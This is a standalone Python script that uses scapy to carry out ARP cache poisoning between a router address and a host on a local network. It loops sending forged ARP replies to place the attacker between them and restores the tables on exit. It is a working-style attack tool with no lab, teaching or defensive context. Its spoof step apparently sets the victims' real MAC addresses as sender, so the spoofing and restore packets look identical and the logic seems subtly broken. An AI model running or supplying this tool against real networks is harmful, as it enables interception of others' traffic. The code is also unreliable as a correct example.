#!/usr/bin/python

import scapy.all as scapy
import time  # Import the time module for a sleep interval

def restore(dip, sip, dmac, smac):
    packet = scapy.ARP(op=2, pdst=dip, hwdst=dmac, psrc=sip, hwsrc=smac)
    scapy.send(packet, verbose=False)

def get_target_mac(target_ip):
    arp_request = scapy.ARP(pdst=target_ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    finalpacket = broadcast / arp_request
    ans = scapy.srp(finalpacket, timeout=2, verbose=False)[0]
    mac = ans[0][1].hwsrc
    return mac

def spoof_arp(target_ip, spoof_ip, tmac, smac):
    packet = scapy.ARP(op=2, hwdst=tmac, pdst=target_ip, psrc=spoof_ip, hwsrc=smac)
    scapy.send(packet, verbose=False)

def main():
    target_ip = "192.168.29.1"
    spoofed_ip = "192.168.29.196"
    
    try:
        target_mac = get_target_mac(target_ip)
        spoofed_mac = get_target_mac(spoofed_ip)
        
        while True:
            spoof_arp(target_ip, spoofed_ip, target_mac, spoofed_mac)
            spoof_arp(spoofed_ip, target_ip, spoofed_mac, target_mac)
            time.sleep(2)  # Introduce a delay to control the frequency of ARP spoofing
            
    except KeyboardInterrupt:
        restore(target_ip, spoofed_ip, target_mac, spoofed_mac)
        restore(spoofed_ip, target_ip, spoofed_mac, target_mac)

if __name__ == "__main__":
    main()
